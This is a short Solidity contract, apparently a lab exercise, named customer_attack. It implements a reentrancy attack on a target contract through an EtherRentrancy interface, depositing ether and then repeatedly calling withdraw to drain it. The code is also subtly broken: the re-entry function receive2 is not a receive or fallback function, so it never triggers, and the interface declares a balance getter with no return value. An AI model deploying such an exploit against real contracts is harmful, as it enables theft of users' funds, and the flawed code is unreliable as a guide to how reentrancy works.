
pragma solidity < 0.8.0;

interface EtherRentrancy{
    function withdraw(uint _amount) external;
    function geteBalance() external view;
    function deposit() external payable;
}
contract customer_attack{
    EtherRentrancy etherrentrancy;
    
    
    
    constructor(address _etherrentrancy) public {
        etherrentrancy = EtherRentrancy(_etherrentrancy);
    }
    
    function getaBalance(address ad) external returns(uint256){
        return ad.balance;

    }
    function receive2() public payable {
        /*if (etherrentrancy.geteBalance() >= (1 ether))*/
            EtherRentrancy(etherrentrancy).withdraw(1 ether);
            
        
    }
    
    
    function attacker() external payable{
        require(msg.value >= 1 ether);
        etherrentrancy.deposit{value: msg.value}();
        etherrentrancy.withdraw(1 ether);
        
        
    }
    
}